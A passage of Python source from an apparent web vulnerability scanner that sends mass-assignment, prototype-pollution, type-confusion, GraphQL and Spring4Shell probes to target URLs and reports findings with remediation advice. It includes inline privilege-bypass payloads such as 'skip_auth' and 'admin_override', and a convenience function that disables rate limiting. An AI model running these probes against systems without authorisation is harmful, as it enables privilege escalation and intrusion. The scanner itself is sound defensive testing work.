                            description=f"__proto__ payload accepted. {payload_obj.description}",
                            matched_at=url,
                            evidence=[
                                f"Payload: {json.dumps(payload)}",
                                "Response indicates pollution",
                            ],
                            cwe="CWE-1321",
                            cvss_score=9.8,
                            remediation=(
                                "1. Sanitize JSON input to remove __proto__ and constructor\n"
                                "2. Use Object.create(null) for dictionaries\n"
                                "3. Use Map instead of plain objects\n"
                                "4. Update vulnerable libraries (lodash, jQuery)"
                            ),
                        ))
                        return findings
                
                # Check for error indicating proto handling
                if response.status_code == 500:
                    if "__proto__" in body or "prototype" in body:
                        findings.append(Finding(
                            name="Prototype Pollution Detected (Error)",
                            severity="HIGH",
                            confidence="MEDIUM",
                            description="__proto__ payload caused server error, indicating possible vulnerability",
                            matched_at=url,
                            evidence=[
                                f"Payload: {json.dumps(payload)}",
                                f"Error response: {response.text[:200]}",
                            ],
                            cwe="CWE-1321",
                            cvss_score=8.1,
                            remediation="Sanitize JSON input to filter __proto__ and constructor properties",
                        ))
                        return findings
                        
            except Exception as e:
                logger.debug(f"Prototype pollution test error: {e}")
        
        return findings
    
    async def _test_nested_injection(
        self,
        client: httpx.AsyncClient,
        url: str,
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Test for nested object injection."""
        findings = []
        
        for payload_obj in self.NESTED_INJECTION_PAYLOADS:
            await rate_limiter.acquire()
            
            payload = payload_obj.data
            
            try:
                response = await client.post(
                    url,
                    json=payload,
                    headers={"Content-Type": "application/json"}
                )
                
                if response.status_code in [200, 201, 202]:
                    try:
                        resp_json = response.json()
                        resp_str = json.dumps(resp_json).lower()
                        
                        # Check for signs of nested injection
                        if any(indicator in resp_str for indicator in [
                            '"admin": true', '"role": "admin"', '"is_admin": true',
                            '"isadmin": true', '"permissions": ["*"]'
                        ]):
                            field_name = list(payload.keys())[0]
                            
                            findings.append(Finding(
                                name=f"Nested Object Injection: {field_name}",
                                severity=payload_obj.severity,
                                confidence="HIGH",
                                description=f"Nested object injection successful via '{field_name}'. {payload_obj.description}",
                                matched_at=url,
                                evidence=[
                                    f"Payload: {json.dumps(payload)}",
                                    f"Response: {response.text[:200]}",
                                ],
                                cwe="CWE-915",
                                cvss_score=8.1,
                                remediation="Flatten input validation, don't auto-merge nested objects",
                            ))
                            return findings
                    except json.JSONDecodeError as e:
                        logger.debug(f"JSON parse error in response: {e}")
                        
            except Exception as e:
                logger.debug(f"Nested injection test error: {e}")
        
        return findings
    
    async def _test_type_confusion(
        self,
        client: httpx.AsyncClient,
        url: str,
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Test for type confusion attacks."""
        findings = []
        
        for payload_obj in self.TYPE_CONFUSION_PAYLOADS:
            await rate_limiter.acquire()
            
            payload = payload_obj.data
            
            try:
                response = await client.post(
                    url,
                    json=payload,
                    headers={"Content-Type": "application/json"}
                )
                
                if response.status_code in [200, 201]:
                    try:
                        resp_json = response.json()
                        resp_str = json.dumps(resp_json).lower()
                        
                        # Check for type coercion indicators
                        field_name = list(payload.keys())[0]
                        
                        if field_name.lower() in resp_str and (
                            "true" in resp_str or "admin" in resp_str
                        ):
                            findings.append(Finding(
                                name=f"Type Confusion: {payload_obj.description}",
                                severity=payload_obj.severity,
                                confidence="MEDIUM",
                                description=f"Type confusion attack successful. {payload_obj.description}",
                                matched_at=url,
                                evidence=[
                                    f"Payload: {json.dumps(payload)}",
                                    f"Response: {response.text[:200]}",
                                ],
                                cwe="CWE-915",
                                cvss_score=7.5,
                                remediation="Implement strict type checking on all input parameters",
                            ))
                            return findings
                    except json.JSONDecodeError as e:
                        logger.debug(f"JSON parse error in response: {e}")
                        
            except Exception as e:
                logger.debug(f"Type confusion test error: {e}")
        
        return findings
    
    async def _test_array_pollution(
        self,
        client: httpx.AsyncClient,
        url: str,
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Test for array pollution attacks."""
        findings = []
        
        for payload_obj in self.ARRAY_POLLUTION_PAYLOADS:
            await rate_limiter.acquire()
            
            payload = payload_obj.data
            
            try:
                response = await client.post(
                    url,
                    json=payload,
                    headers={"Content-Type": "application/json"}
                )
                
                if response.status_code in [200, 201]:
                    try:
                        resp_json = response.json()
                        resp_str = json.dumps(resp_json).lower()
                        
                        if "admin" in resp_str and ("roles" in resp_str or "permissions" in resp_str):
                            findings.append(Finding(
                                name="Array Pollution Accepted",
                                severity=payload_obj.severity,
                                confidence="HIGH",
                                description=f"Array pollution with admin values accepted. {payload_obj.description}",
                                matched_at=url,
                                evidence=[
                                    f"Payload: {json.dumps(payload)}",
                                    f"Response: {response.text[:200]}",
                                ],
                                cwe="CWE-915",
                                cvss_score=8.1,
                                remediation="Validate array contents against allowlist of valid values",
                            ))
                            return findings
                    except json.JSONDecodeError as e:
                        logger.debug(f"JSON parse error in response: {e}")
                        
            except Exception as e:
                logger.debug(f"Array pollution test error: {e}")
        
        return findings
    
    async def _test_framework_specific(
        self,
        client: httpx.AsyncClient,
        url: str,
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Test framework-specific mass assignment vectors."""
        findings = []
        
        payloads = []
        if self.detected_framework == FrameworkType.RAILS:
            payloads = self.RAILS_PAYLOADS
        elif self.detected_framework == FrameworkType.DJANGO:
            payloads = self.DJANGO_PAYLOADS
        elif self.detected_framework == FrameworkType.LARAVEL:
            payloads = self.LARAVEL_PAYLOADS
        elif self.detected_framework == FrameworkType.SPRING:
            payloads = self.SPRING_PAYLOADS
        
        for payload_obj in payloads:
            await rate_limiter.acquire()
            
            payload = payload_obj.data
            
            try:
                response = await client.post(
                    url,
                    json=payload,
                    headers={"Content-Type": "application/json"}
                )
                
                # Check for Spring4Shell specifically
                if "class.module" in str(payload):
                    if response.status_code != 400:
                        findings.append(Finding(
                            name="Potential Spring4Shell Vulnerability (CVE-2022-22965)",
                            severity="CRITICAL",
                            confidence="MEDIUM",
                            description="Spring Framework may be vulnerable to Spring4Shell RCE",
                            matched_at=url,
                            evidence=[
                                f"Payload: {json.dumps(payload)}",
                                f"Response: {response.status_code}",
                            ],
                            cwe="CWE-94",
                            cvss_score=9.8,
                            remediation="Upgrade Spring Framework to patched version immediately",
                        ))
                        return findings
                
                if response.status_code in [200, 201]:
                    try:
                        resp_json = response.json()
                        resp_str = json.dumps(resp_json).lower()
                        
                        if any(indicator in resp_str for indicator in ["admin", "role_admin", "superuser"]):
                            findings.append(Finding(
                                name=f"Framework-Specific Mass Assignment ({self.detected_framework.value})",
                                severity=payload_obj.severity,
                                confidence="HIGH",
                                description=f"Framework-specific mass assignment successful. {payload_obj.description}",
                                matched_at=url,
                                evidence=[
                                    f"Framework: {self.detected_framework.value}",
                                    f"Payload: {json.dumps(payload)}",
                                ],
                                cwe="CWE-915",
                                cvss_score=8.5,
                                remediation=f"Use {self.detected_framework.value} protection mechanisms (strong params, etc.)",
                            ))
                            return findings
                    except json.JSONDecodeError as e:
                        logger.debug(f"JSON parse error in response: {e}")
                        
            except Exception as e:
                logger.debug(f"Framework-specific test error: {e}")
        
        return findings
    
    async def _test_hidden_parameters(
        self,
        client: httpx.AsyncClient,
        url: str,
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Discover and test hidden parameters."""
        findings = []
        
        # Test common hidden parameters
        hidden_payloads = [
            {"debug": True, "internal": True},
            {"skip_auth": True, "bypass": True},
            {"admin_override": True},
            {"_internal": True, "_debug": True},
            {"beta_features": True, "experimental": True},
        ]
        
        for payload in hidden_payloads:
            await rate_limiter.acquire()
            
            try:
                response = await client.post(
                    url,
                    json=payload,
                    headers={"Content-Type": "application/json"}
                )
                
                if response.status_code == 200:
                    resp_text = response.text.lower()
                    
                    # Check for debug/internal information exposure
                    if any(indicator in resp_text for indicator in [
                        "stack", "trace", "debug", "internal", "error_details",
                        "sql", "query", "config", "environment"
                    ]):
                        findings.append(Finding(
                            name="Hidden Parameter Accepted (Debug/Internal)",
                            severity="MEDIUM",
                            confidence="MEDIUM",
                            description="Application accepted debug/internal hidden parameters",
                            matched_at=url,
                            evidence=[
                                f"Payload: {json.dumps(payload)}",
                                "Debug information may be exposed",
                            ],
                            cwe="CWE-200",
                            cvss_score=5.3,
                            remediation="Remove debug parameters from production or require authentication",
                        ))
                        return findings
                        
            except Exception as e:
                logger.debug(f"Hidden parameter test error: {e}")
        
        return findings
    
    async def _test_graphql_mutations(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Test GraphQL mutations for mass assignment."""
        findings = []
        
        graphql_endpoints = ["/graphql", "/gql", "/api/graphql", "/v1/graphql"]
        
        for endpoint in graphql_endpoints:
            await rate_limiter.acquire()
            
            url = urljoin(base_url, endpoint)
            
            for payload_obj in self.GRAPHQL_PAYLOADS:
                try:
                    response = await client.post(
                        url,
                        json=payload_obj.data,
                        headers={"Content-Type": "application/json"}
                    )
                    
                    if response.status_code == 200:
                        try:
                            resp_json = response.json()
                            
                            # Check for successful mutation
                            if "data" in resp_json and resp_json["data"]:
                                if "errors" not in resp_json:
                                    findings.append(Finding(
                                        name="GraphQL Mass Assignment Mutation",
                                        severity=payload_obj.severity,
                                        confidence="HIGH",
                                        description=f"GraphQL mutation accepted privilege escalation. {payload_obj.description}",
                                        matched_at=url,
                                        evidence=[
                                            f"Query: {payload_obj.data.get('query', '')}",
                                            f"Response: {json.dumps(resp_json)[:200]}",
                                        ],
                                        cwe="CWE-915",
                                        cvss_score=9.1,
                                        remediation="Implement input validation in GraphQL resolvers",
                                    ))
                                    return findings
                        except json.JSONDecodeError as e:
                            logger.debug(f"GraphQL JSON parse error: {e}")

                except Exception as e:
                    logger.debug(f"GraphQL test error: {e}")
        
        return findings
    
    async def _get_baseline(
        self,
        client: httpx.AsyncClient,
        url: str,
    ) -> Optional[tuple[int, str]]:
        """Get baseline response for comparison."""
        try:
            response = await client.post(
                url,
                json={"test": "baseline"},
                headers={"Content-Type": "application/json"}
            )
            return (response.status_code, response.text[:500])
        except Exception:
            return None
    
    async def _check_injection_success(
        self,
        baseline: tuple[int, str],
        response: httpx.Response,
        payload: dict
    ) -> bool:
        """Check if field injection was successful."""
        baseline_status, baseline_body = baseline
        
        # Rejected request
        if response.status_code >= 400:
            return False
        
        field_name = list(payload.keys())[0]
        field_value = str(list(payload.values())[0]).lower()
        
        try:
            resp_data = response.json()
            resp_str = json.dumps(resp_data).lower()
            
            # Check if injected field appears in response
            if field_name.lower() in resp_str:
                if field_value in resp_str:
                    return True
                # Check for boolean true
                if field_value == "true" and "true" in resp_str:
                    return True
            
            # Check for success indicators with changed response
            if "success" in resp_str and response.status_code in [200, 201]:
                if response.text != baseline_body:
                    return True
                    
        except json.JSONDecodeError as e:
            # Fallback: check response text when JSON is invalid
            logger.debug(f"JSON parse error, checking text response: {e}")
            if field_name.lower() in response.text.lower():
                return True
        
        return False
    
    def _deduplicate_findings(self, findings: list[Finding]) -> list[Finding]:
        """Remove duplicate findings."""
        seen = set()
        unique = []
        
        for finding in findings:
            key = (finding.name, finding.matched_at)
            if key not in seen:
                seen.add(key)
                unique.append(finding)
        
        return unique


async def scan_mass_assignment(
    host: str,
    asset_data: dict,
    settings: Any = None
) -> list[Finding]:
    """Convenience function to run Mass Assignment scan."""
    scanner = MassAssignmentScanner(settings)
    
    class DummyRateLimiter:
        async def acquire(self):
            pass
    
    return await scanner.scan(host, asset_data, DummyRateLimiter())
